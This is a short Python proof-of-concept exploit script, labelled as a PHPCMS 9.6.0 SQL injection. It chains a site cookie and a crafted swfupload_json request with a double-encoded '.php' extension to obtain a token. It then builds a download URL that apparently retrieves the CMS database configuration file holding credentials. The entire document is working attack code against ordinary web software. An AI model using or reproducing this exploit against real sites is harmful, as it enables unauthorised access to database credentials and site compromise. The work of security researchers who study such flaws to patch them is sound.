#!/usr/bin/env python
# coding: utf-8
#Authon:phyb0x
#phpcms9.6.0 sqli

import requests

def poc(host):
	step = '{}index.php?m=wap&a=index&siteid=1'.format(host)
	req = requests.get(url=step)
	for i in req.cookies:
		if i.name[-7:] == '_siteid':
			userid_flash = i.value
		else:
			print('Step1 is error')
	step1 = '{}index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dcaches/configs/database%26f%3D.p%25253chp'.format(host)

	data = {'userid_flash':userid_flash}
	req1 = requests.post(url=step1,data=data)

	for i in req1.cookies:
		if i.name[-9:] == '_att_json':
			a_k = i.value
	if a_k == '':
		print('sys_paylaod Bad')

	url = '{}index.php?m=content&c=down&a_k={}'.format(host,a_k)
	print(url)

if __name__ == '__main__':
	poc('http://127.0.0.1/phpcmsv9.6.1/')